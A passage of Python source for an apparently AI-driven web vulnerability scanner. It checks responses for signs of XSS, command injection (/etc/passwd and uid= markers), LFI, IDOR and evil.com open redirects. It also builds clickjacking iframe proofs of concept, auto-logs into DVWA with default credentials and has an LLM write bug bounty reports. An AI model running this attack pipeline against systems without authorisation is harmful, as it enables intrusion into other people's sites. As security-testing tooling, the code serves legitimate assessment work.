                'onclick=', 'onmouseenter=', 'javascript:', 'eval(',
                'expression(', 'onanimationend=', 'ontransitionend='
            ])
            if has_js:
                return True, f"XSS payload reflected unescaped with JS execution: {payload[:60]}"
            else:
                # It's HTML injection, not XSS — log but don't confirm as XSS
                log('info', f'  ℹ HTML injection detected (not XSS): {payload[:50]}')
                # Record as html_injection instead
                fid = fp('GET', url, param, 'html_injection')
                finding = {
                    'id': fid, 'url': url, 'method': 'GET',
                    'param': param, 'vuln_type': 'html_injection',
                    'payload': payload, 'evidence': f'HTML tags rendered but no JS execution possible: {payload[:60]}',
                    'severity': 'Low',
                    'confirmed': True,
                    'response_code': resp['status_code'],
                    'response_snippet': body[:500],
                    'timestamp': time.time()
                }
                if write_finding(finding):
                    socketio.emit('finding', finding)
                return False, ""

    elif vtype == 'cmdi':
        cmd_evidence = [
            ('uid=', 'Unix uid output found'),
            ('root:x:0:0:', '/etc/passwd content leaked'),
            ('root:x:0:0', 'System file contents revealed'),
            ('daemon:', 'System user list exposed'),
            ('www-data', 'Web server user info exposed'),
            ('bin/bash', 'Shell path revealed'),
            ('Linux ', 'OS info leaked via uname'),
            ('total ', 'Directory listing output (ls command)'),
            ('drwx', 'Directory permission listing leaked'),
        ]
        for marker, desc in cmd_evidence:
            if marker in body and marker not in bl_body:
                return True, desc

        if atk_len > bl_len + 50:
            extra = body[len(bl_body):] if len(body) > len(bl_body) else body
            if any(m in extra for m, _ in cmd_evidence):
                return True, "Command execution output detected"

    elif vtype == 'lfi':
        lfi_markers = [
            ('root:x:0:0:', '/etc/passwd file contents exposed'),
            ('[boot loader]', 'Windows boot.ini exposed'),
            ('root:*:0:0:', '/etc/passwd (BSD) exposed'),
            ('[extensions]', 'PHP ini file exposed'),
            ('[PHP]', 'PHP configuration exposed'),
            ('<?php', 'PHP source code exposed'),
        ]
        for marker, desc in lfi_markers:
            if marker in body and marker not in bl_body:
                return True, desc

    elif vtype == 'idor':
        # Stricter IDOR check — require meaningful data difference
        if atk_len != bl_len and abs(atk_len - bl_len) > 50:
            bl_text = _extract_relevant(bl_body)
            atk_text = _extract_relevant(body)
            # Both must have real content and be substantially different
            if len(bl_text) > 20 and len(atk_text) > 20:
                # Check similarity — if texts share less than 70% content, it might be different user data
                common = set(bl_text.split()) & set(atk_text.split())
                total_words = max(len(set(bl_text.split())), len(set(atk_text.split())), 1)
                similarity = len(common) / total_words
                if similarity < 0.7:
                    return True, f"Different data returned for different ID (similarity: {similarity:.0%})"

    elif vtype == 'open_redirect':
        if resp['status_code'] in (301, 302, 303, 307):
            location = resp.get('headers', {}).get('Location', '')
            if location and ('evil.com' in location or payload in location):
                return True, f"Open redirect confirmed: Location header points to {location[:100]}"

    # ── AI Analysis as fallback ──────────────────────────────────────────
    try:
        bl_text = _extract_relevant(bl_body)[:1500]
        atk_text = _extract_relevant(body)[:2000]

        prompt = f"""Determine if this web vulnerability was ACTUALLY exploited. Be VERY strict.

VULN: {vtype} | URL: {url} | PARAM: {param} | PAYLOAD: {payload}

BASELINE: status={baseline['status_code'] if baseline else 'N/A'} len={bl_len}
{bl_text}

ATTACK: status={resp['status_code']} len={atk_len}
{atk_text}

STRICT RULES:
- SQLi: ONLY confirm if you see SQL error messages, extra database rows, or data from other users. Response size differences alone are NOT proof.
- XSS: ONLY confirm if a JavaScript-executing payload (<script>, onerror=, onload=) appears UNESCAPED in the response. If only benign HTML tags like <u>, <b>, <i> are reflected, that is HTML injection NOT XSS. HTML injection is NOT XSS.
- CMDi: ONLY confirm if you see actual OS command output (uid=, /etc/passwd contents, directory listings) that was NOT in the baseline.
- LFI: ONLY confirm if system file contents appear.
- IDOR: ONLY confirm if you see DIFFERENT user's private data.
- Open Redirect: ONLY confirm if Location header redirects to attacker-controlled domain.

When in doubt, say NOT vulnerable. False positives are worse than false negatives.

ONLY JSON: {{"vulnerable": true/false, "evidence": "proof"}}"""

        raw = ai_call(prompt, temp=0.1)
        result = parse_json(raw)
        if isinstance(result, dict):
            return result.get('vulnerable', False), result.get('evidence', '')
    except Exception:
        pass

    return False, ""


# ─── Stage 3.5: Security Header + Clickjacking Check ────────────────────────

def step_header_check(target_url, session):
    """Check for missing security headers and clickjacking."""
    log('info', '═══ STAGE 3.5: SECURITY HEADERS & CLICKJACKING ═══')

    try:
        r = session.get(target_url, timeout=10)
        headers = {k.lower(): v for k, v in r.headers.items()}

        # ── Clickjacking check (separate, higher severity) ──
        has_xfo = 'x-frame-options' in headers
        has_csp_frame = False
        csp_value = headers.get('content-security-policy', '')
        if csp_value:
            has_csp_frame = 'frame-ancestors' in csp_value.lower()

        if not has_xfo and not has_csp_frame:
            log('warn', '  🖼️ CLICKJACKING VULNERABLE — No X-Frame-Options or frame-ancestors CSP!')
            log('warn', '  ⚠ This site can be embedded in an iframe by any attacker')

            fid = fp('GET', target_url, 'X-Frame-Options', 'clickjacking')
            finding = {
                'id': fid, 'url': target_url, 'method': 'GET',
                'param': 'X-Frame-Options / CSP frame-ancestors',
                'vuln_type': 'clickjacking',
                'payload': f'<iframe src="{target_url}" width="800" height="600"></iframe>',
                'evidence': 'Missing X-Frame-Options header AND no frame-ancestors in CSP. '
                            'The page can be embedded in a malicious iframe for UI redressing attacks.',
                'severity': 'Medium',
                'confirmed': True,
                'response_code': r.status_code,
                'response_snippet': f'Response headers:\n'
                    f'X-Frame-Options: MISSING\n'
                    f'Content-Security-Policy: {csp_value[:200] if csp_value else "MISSING"}\n\n'
                    f'PoC: Create an HTML file with:\n'
                    f'<iframe src="{target_url}" width="100%" height="600"></iframe>',
                'timestamp': time.time()
            }
            if write_finding(finding):
                socketio.emit('finding', finding)
        else:
            protection = []
            if has_xfo:
                protection.append(f'X-Frame-Options: {headers["x-frame-options"]}')
            if has_csp_frame:
                protection.append(f'CSP frame-ancestors present')
            log('ok', f'  ✅ Clickjacking protected: {", ".join(protection)}')

        # ── Other security headers ──
        other_headers = {
            'x-content-type-options': 'MIME sniffing protection (X-Content-Type-Options)',
            'x-xss-protection': 'Browser XSS filter (X-XSS-Protection)',
            'strict-transport-security': 'HSTS (Strict-Transport-Security)',
            'referrer-policy': 'Referrer policy',
        }

        missing = []
        present = []
        for header, description in other_headers.items():
            if header in headers:
                present.append(f'  ✅ {description}: {headers[header][:80]}')
            else:
                missing.append(description)

        for p in present:
            log('ok', p)

        if missing:
            log('warn', f'  ⚠ Other missing headers:')
            for m in missing:
                log('warn', f'    ✗ {m}')

            fid = fp('GET', target_url, 'headers', 'security_headers')
            finding = {
                'id': fid, 'url': target_url, 'method': 'GET',
                'param': 'HTTP Headers', 'vuln_type': 'security_headers',
                'payload': 'N/A', 'evidence': f'Missing: {", ".join(missing)}',
                'severity': 'Info',
                'confirmed': True,
                'response_code': r.status_code,
                'response_snippet': json.dumps(dict(r.headers), indent=2)[:500],
                'timestamp': time.time()
            }
            if write_finding(finding):
                socketio.emit('finding', finding)

    except Exception as e:
        log('error', f'Header check error: {e}')


# ─── Stage 4: Reports ───────────────────────────────────────────────────────

def step_reports():
    log('info', '═══ STAGE 4: REPORTS ═══')
    findings = [f for f in read_findings() if f.get('confirmed')]

    for i, f in enumerate(findings):
        if is_cancelled():
            break

        rpath = Path('reports') / f"{f['id']}.md"
        if rpath.exists():
            log('info', f'  Report {rpath.name} already exists')
            continue

        emit_progress(i + 1, len(findings), 'report')

        prompt = f"""Write a professional bug bounty report.

VULN: {f['vuln_type']} | SEVERITY: {f['severity']}
URL: {f['url']} | METHOD: {f['method']} | PARAM: {f['param']}
PAYLOAD: {f['payload']}
EVIDENCE: {f['evidence']}
RESPONSE CODE: {f.get('response_code', '')}
RESPONSE: {f.get('response_snippet', '')[:800]}

Format:
# {f['severity']} — [Title]
## Summary
## Affected Endpoint
## Steps to Reproduce (with curl command)
## Impact
## Remediation"""

        try:
            report = ai_call(prompt, temp=0.3)
            rpath.write_text(report)
            log('ok', f'  Report generated: {rpath.name}')
        except Exception as e:
            rpath.write_text(
                f"# {f['severity']} — {f['vuln_type'].upper()} in {f['param']}\n\n"
                f"**URL:** {f['url']}\n**Method:** {f['method']}\n"
                f"**Payload:** `{f['payload']}`\n**Evidence:** {f['evidence']}\n"
            )
            log('warn', f'  Template report saved ({e})')


# ─── Pipeline ────────────────────────────────────────────────────────────────

def run_pipeline(target_url, cookies_str='', auto_login=True, username='', password=''):
    global scan_active
    start = time.time()
    scan_cancel.clear()

    try:
        log('info', '═══ SCAN STARTED ═══')
        log('info', f'Target: {target_url}')
        log('info', f'Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
        log('info', f'AI: {AI_PROVIDER.upper()}')

        is_dvwa = False

        # ── Detect target type & setup session ──
        if auto_login:
            try:
                test_session = create_session()
                r_check = test_session.get(target_url, timeout=8, allow_redirects=True)
                page_lower = r_check.text.lower()
                is_dvwa = 'damn vulnerable web application' in page_lower or 'dvwa' in page_lower
            except Exception:
                is_dvwa = False

            if is_dvwa:
                log('info', '🎯 DVWA detected — attempting auto-login')
                session = dvwa_auto_login(target_url, username or 'admin', password or 'password')
                if not session:
                    log('error', 'DVWA auto-login failed. Try providing cookies manually.')
                    return
            elif username and password:
                log('info', '🔑 Credentials provided — attempting generic auto-login')
                session = generic_auto_login(target_url, username, password)
                if not session:
                    log('warn', 'Generic login failed — continuing without auth')
                    session = create_session()
            else:
                log('info', '🌐 Generic target — scanning without authentication')
                session = create_session()
        else:
            session = create_session(cookies_str)
            # Verify session
            try:
                r = session.get(target_url, timeout=10)
                if 'login.php' in r.url and 'login' not in target_url.lower():
                    log('error', 'Cookie session invalid — redirected to login.')
                    return
                log('ok', 'Cookie session verified')
            except Exception as e:
                log('error', f'Session verification failed: {e}')
                return

        if is_cancelled():
            log('warn', 'Scan cancelled')
            return

        # ── Stage 1: Crawl ──
        socketio.emit('stage', {'stage': 'crawl', 'status': 'active'})
        endpoints, detected_dvwa = step_crawl(target_url, session)
        is_dvwa = is_dvwa or detected_dvwa
        socketio.emit('stage', {'stage': 'crawl', 'status': 'done'})

        if is_cancelled():
            log('warn', 'Scan cancelled after crawl')
            return

        if not endpoints:
            log('warn', 'No endpoints found. The target may require authentication or has no forms/queries.')
            socketio.emit('stage', {'stage': 'complete', 'status': 'done'})
            return

        # ── Stage 2: Classify ──
        socketio.emit('stage', {'stage': 'classify', 'status': 'active'})
        classified = step_classify(endpoints)
        socketio.emit('stage', {'stage': 'classify', 'status': 'done'})

        if is_cancelled():
            log('warn', 'Scan cancelled after classify')
            return

        # ── Stage 3: Attack ──
        socketio.emit('stage', {'stage': 'attack', 'status': 'active'})
        step_attack(classified, session, is_dvwa)
        socketio.emit('stage', {'stage': 'attack', 'status': 'done'})

        if is_cancelled():
            log('warn', 'Scan cancelled after attack')
            return

        # ── Stage 3.5: Security Headers ──
        step_header_check(target_url, session)

        # ── Stage 4: Reports ──
        socketio.emit('stage', {'stage': 'report', 'status': 'active'})
        step_reports()
        socketio.emit('stage', {'stage': 'report', 'status': 'done'})

        # ── Done ──
        dur = round(time.time() - start, 1)
        confirmed = [f for f in read_findings() if f.get('confirmed')]
        severity_breakdown = {}
        for f in confirmed:
            sev = f.get('severity', 'Unknown')
            severity_breakdown[sev] = severity_breakdown.get(sev, 0) + 1

        socketio.emit('scan_complete', {
            'duration': dur,
            'total': len(read_findings()),
            'confirmed': len(confirmed),
            'severity': severity_breakdown,
            'cancelled': is_cancelled()
        })
        log('ok', f'═══ SCAN COMPLETE: {len(confirmed)} vulns in {dur}s ═══')

    except Exception as e:
        log('error', f'Pipeline error: {e}')
        import traceback
        log('error', traceback.format_exc())
    finally:
        scan_active = False
        socketio.emit('stage', {'stage': 'complete', 'status': 'done'})


# ─── Routes ──────────────────────────────────────────────────────────────────

@app.route('/')
def index():
    return send_file('static/index.html')

@app.route('/scan', methods=['POST'])
def start_scan():
    global scan_active
    if scan_active:
        return jsonify({'error': 'Scan already running'}), 409

    data = request.get_json()
    url = data.get('target_url', '').strip()
    cookies = data.get('cookies', '').strip()
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()

    if not url:
        return jsonify({'error': 'URL required'}), 400
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    # Clear previous findings
    Path('findings.json').write_text('[]')

    auto = not bool(cookies)

    scan_active = True
    scan_cancel.clear()
    threading.Thread(
        target=run_pipeline,
        args=(url, cookies, auto, username, password),
        daemon=True
    ).start()
    return jsonify({'status': 'started'})

@app.route('/scan/cancel', methods=['POST'])
def cancel_scan():
    global scan_active
    if not scan_active:
        return jsonify({'error': 'No scan running'}), 409
    scan_cancel.set()
    log('warn', '⚠ Scan cancellation requested...')
    return jsonify({'status': 'cancelling'})

@app.route('/findings')
def get_findings():
    return jsonify(read_findings())

@app.route('/reports/<path:filename>')
def get_report(filename):
    p = Path('reports') / Path(filename).name
    if not p.exists():
        return 'Report not found', 404
    return p.read_text(), 200, {'Content-Type': 'text/plain; charset=utf-8'}

@app.route('/status')
def status():
    return jsonify({
        'active': scan_active,
        'ai_provider': AI_PROVIDER,
        'findings_count': len(read_findings())
    })

@app.route('/export')
def export_findings():
    """Export all findings as JSON."""
    findings = read_findings()
    return jsonify(findings), 200, {
        'Content-Disposition': 'attachment; filename=findings.json'
    }

@socketio.on('connect')
def on_connect():
    log('info', '🔌 Dashboard connected')

if __name__ == '__main__':
    port = int(os.environ.get('FLASK_PORT', '7331'))
    print(f"\n  🎯 AI-Powered Bug Bounty Scanner")
    print(f"  🌐 http://127.0.0.1:{port}")
    print(f"  🤖 AI Provider: {AI_PROVIDER.upper()}")
    print(f"  📁 Reports: ./reports/")
    print()
    socketio.run(app, host='127.0.0.1', port=port, debug=False, allow_unsafe_werkzeug=True)
